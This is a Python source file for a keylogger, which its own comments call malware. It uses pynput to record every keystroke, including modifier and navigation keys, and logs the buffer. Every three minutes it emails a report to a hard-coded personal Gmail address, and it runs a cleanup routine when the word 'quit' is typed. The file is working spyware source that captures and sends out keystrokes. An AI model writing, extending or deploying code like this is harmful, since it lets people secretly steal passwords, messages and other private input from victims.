from pynput import keyboard
from mail import send_email
from datetime import datetime
from cleanup import cleanup
from settingUp import text,lastLogTime
import time
import logging

# List (or better: set) of special keys you want to log
special_keys = {
    keyboard.Key.shift,
    keyboard.Key.shift_l,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.esc,
    keyboard.Key.alt,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.cmd,
    keyboard.Key.cmd_l,
    keyboard.Key.cmd_r,
    keyboard.Key.caps_lock,
    keyboard.Key.delete,
    keyboard.Key.insert,
    keyboard.Key.up,
    keyboard.Key.down,
    keyboard.Key.left,
    keyboard.Key.right,
    keyboard.Key.home,
    keyboard.Key.end,
    keyboard.Key.page_up,
    keyboard.Key.page_down,
    keyboard.Key.num_lock,
    keyboard.Key.scroll_lock,
    keyboard.Key.print_screen,
    keyboard.Key.pause,
    keyboard.Key.menu,
    keyboard.Key.media_volume_down,
    keyboard.Key.media_volume_mute,
    keyboard.Key.media_volume_up,
    keyboard.Key.media_play_pause,
    keyboard.Key.alt_gr
}

#function: to handle different type of key strokes
def on_press(key):
    global text, lastLogTime, special_keys # to use the text and lastlogtime variable inside the function
    
    # handle special keys: append readable notations or perform specific action
    if key == keyboard.Key.enter:
        text += "\n" # New line for enter key
    elif key == keyboard.Key.tab:
        text += "\t" # Tab character for tab key
    elif key == keyboard.Key.space:
        text += " "  # Space for space key
    elif key in  special_keys:
        text += f" [{key}] "
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    else:
    # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
        text += str(key).strip("'")

    print(text)
    # Do the following things every 5 minutes(300 seconds) or 3min (180 seconds)
    if time.time() -lastLogTime > 180 :
        # log the data so far collected
        logging.info(str(text))
        logging.info(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        # check if the data have the following word it is there only for testing purpose
        #  in real malware we don't need this part if the "quit" word is there in the data 
        # we will do the cleaning process
        # uncomment the following part so that it will send email when it is mid-night for 
        # testing purpose only I am sending mail per 3/5 min 

        # if "quit" in text: 
        #     cleanup()
        #     return False
        
        # text = ""
        # lastLogTime = time.time()

    
    # now = datetime.now()
    # if now.hour == 0 and now.minute == 0 :
        reciever = "bidya.gca@gmail.com"
        sub = "keylog of the day"
        body = f"Todays date and time: {datetime.now()}"
        send_email(reciever,sub,body)

    # When you uncomment the previous parts comment the rest of the part from here
        if "quit" in text: 
            cleanup()
            return False
        
        text = ""
        lastLogTime = time.time()
